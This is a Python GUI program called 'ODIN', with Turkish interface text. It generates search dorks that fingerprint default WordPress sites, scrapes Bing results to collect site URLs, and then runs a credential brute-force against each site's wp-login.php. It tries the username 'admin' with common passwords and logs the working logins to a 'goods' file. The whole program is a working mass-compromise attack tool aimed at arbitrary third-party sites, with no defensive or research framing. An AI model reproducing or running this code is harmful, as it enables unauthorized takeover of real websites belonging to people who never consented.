from random_words import RandomWords
import requests
import urllib.request
import re
from urllib.parse import urlparse as url
from threading import Thread
from tkinter import *
from tkinter import StringVar, IntVar
from tkinter import Tk, Button, Label, font
import time
def update(new):
    var.set(new)
    
    pencere.update_idletasks()

def yeni1():
    pencere2 = Tk()
    pencere2.geometry("1000x1000+200+200")
    pencere2.wm_iconbitmap("odinsimge.ico")
    pencere2.tk_setPalette("black")
    baslik = pencere2.title("Tesekkürler")
    
    label = Label(master=pencere2, text="""TEŞEKKÜR:
Öncelikle proje sırasında sabrını gösteren kullanıcılara içten teşekkürlerimi sunarım. \n Burda herkesin ismini tek tek yazamayacağım fakat
destekleri için başlıca xdebron, Par4d0x1D, Black Viking, 'sadak4t, RAUN, UNEQUAL \n Tasarımlar için stokw ve duman05 olmak üzere herkese derin teşekkürlerimi ve sevgilerimi sunuyorum""",
                  
                  fg="white",
                  bg="#000000",
                  font="Helvetica 13 bold")
    
    label2 = Label(master=pencere2, text="THT Ar-Ge tim onurla sunar...",
                   fg="olive",
                   bg="#000000",
                   font="Helvetica 13 bold")
    labelx = Label(master=pencere2, text="ODIN",
                   fg="olive",
                   bg="#000000",
                   font="norse 24 bold")
    label2.pack()
    labelx.pack()
    
    label.pack()
    mainloop()
def yeni():
    global liste,liste2,liste3,s
    pencere3 = Tk()
    pencere3.geometry("1000x1000+200+200")
    pencere3.wm_iconbitmap("odinsimge.ico")
    pencere3.tk_setPalette("orange")
    baslik = pencere3.title("ODIN PROJECT")
    etiketim = Label(master=pencere3, text="""ODIN'e hoşgeldiniz. Tek yapmanız gereken kaç farklı kelimede dork aranacağını girip aşağıdaki şirin butona basmak.""",
                   fg="#0b83f3",
                   bg="orange",
                   font="Helvetica 13 bold")
    etiketim.pack(side=TOP)
    s = Entry(master=pencere3, bg='white')
    s.pack()
    
    liste = Listbox(master=pencere3, bg='white', fg='black', width=45, height=20)
    listetiket = Label(master=pencere3, text='<-- dorklar', fg="#0b83f3", bg="orange", font="Helvetica 14 italic")
    liste.pack(side=LEFT)
    listetiket.pack(side=LEFT)
    listetiket2 = Label(master=pencere3, text='<-- site', fg="#0b83f3", bg="orange", font="Helvetica 14 italic")
    listetiket3 = Label(master=pencere3, text='<-- basarili', fg="#0b83f3", bg="orange", font="Helvetica 14 italic")
    liste2 = Listbox(master=pencere3, bg='white', fg='black', width=45, height=20)
    liste3 = Listbox(master=pencere3, bg='white', fg='black', width=45, height=20)
    liste2.pack(side=LEFT)
    listetiket2.pack(side=LEFT)
    liste3.pack(side=LEFT)
    listetiket3.pack(side=LEFT)
    basla = Button(master=pencere3, command=dork, text="DORK CEK", fg="white", bg='red', font=butonayar)
    basla.pack()
    basla2 = Button(master=pencere3, command=urlcek, text="ARAMA MOTORU", fg="white", bg='red', font=butonayar)
    basla3 = Button(master=pencere3, command=urloku, text="BRUTE FORCE", fg="white", bg='red', font=butonayar)
    basla2.pack()
    basla3.pack()
    global liste,liste2,liste3
    
def dork():
    global dorks_list
    sayik = int(s.get())
    rw,dorks_list = RandomWords(),[]
    ##sayi = int(s.get(master=pencere3))
    kelime = rw.random_words(count=sayik)
    #dorks = open('dorks.txt', 'w+')
    wp_dork = ['("Comment on Hello world!")', '("author/admin")', '("uncategorized")', '("Just another WordPress site")', '("/wp/hello-world/")', '("uncategorized/hello-world")']
    for word in kelime:
        for dork in wp_dork:
            global x
            x = dork+word
            
            print(x)
            dorks = open('dorks.txt', 'a+')
            dorks.write(x+'\n')
            dorks_list.append(x)
            liste.insert(END,x)
            
    dorks.close()
    return
def urlcek(sayfa=100,urlfile="urller.txt"):
    time.sleep(3)
    f=open(urlfile, 'w+')
    links=[]
    #dorks_list = dorks.readlines()
    #sayfa = 100
    for i in range(len(dorks_list)):
        search = dorks_list[i].strip()
        say = 1
        while (say < sayfa):
            req = ('http://www.bing.com/search?q=' + search + '&first='+str(say))
            try:	
                r = requests.get(req)
            except Exception as e:
                print("[*]Bing.com ' a erişemedim:",e)
            req = ''	
            try:
                link = re.findall('<h2><a href="(.+?)"', r.text)
                for i in range(len(link)):
                    if link[i].find('http://bs.yandex.ru'):
                        #f.write(link[i] + '\n')
                        if link[i] not in links:
                            links.append(link[i])
                            print(link[i])
                        
            except Exception as e:
                #print(e)
                pass
            say = say+10
    links=set(links)
    for x in links:
        uri = url(x)
        getURL = lambda y: "{y.scheme}://{y.netloc}".format(y=y)
        yaz = getURL(uri) + '/'
        liste2.insert(END, yaz)    
        try:
            print(yaz,end="\n",file=f,flush=True)
        except:
            pass
            #f.write(x + '\n')
    print("Sayı:" ,str(len(links)))
    f.close()
    return
def urloku():
    sifreler = ['admin', 'admin123', '123456', 'admin@123', 'adminadmin', 'letmein', 'password']
    session = requests.Session()
    ac = open("urller.txt", "r").readlines()   
    for url in ac:
        url = url.strip()
        global yeni_url
        yeni_url = url + 'wp-login.php'
        yeni_url.strip()
        
        try:
            
            print(yeni_url)
            r = requests.get(yeni_url)
            if "Username" or "Email" or "Password" or "Remember Me" in r.text:
                for sifre in sifreler:
                    try:
                        print(yeni_url, 'deneniyor...')
                        r = session.post(yeni_url, data={"log":"admin","pwd":sifre},timeout=5)
                    except:
                        continue
                    if "Dashboard" in r.text:
                            
                        good = "[+]" + yeni_url + "admin:" + sifre
                        liste3.insert(END,good)
                        print(good)
                        file = open("goods.txt", "a+")
                        file.write(good + "\n")
                        file.close
            else:
                pass
        except:
            continue
    return

pencere = Tk()
pencere.geometry("800x600+100+100")
butonayar = font.Font(family='helvetica', size=10, weight='bold')
yeni_pencere_buton= Button(text="ODIN", command=yeni, fg="white", bg='red', font=butonayar)
yeni_pencere_buton.pack(side='bottom', fill='x')
arkaplan = PhotoImage(file="odin1.gif")
pencere.wm_iconbitmap("simge.ico")
buton1 = Button(text="Teşekkür ve Hakkında", command=yeni1, fg="white", bg='red', font=butonayar)
buton1.pack(side='bottom', fill='x')
baslik = pencere.title("ODIN GIRIS")
var = StringVar()
var.set("ODIN PROJECT \n THT-ARGE")
pencere.tk_setPalette("black")
etiket = Label(pencere,textvariable=var,
               fg="olive",
               bg="#000000",
               font="norse 25 bold")
etiket.pack(side=TOP)
arka = Label(image=arkaplan)
arka.pack(side=TOP)
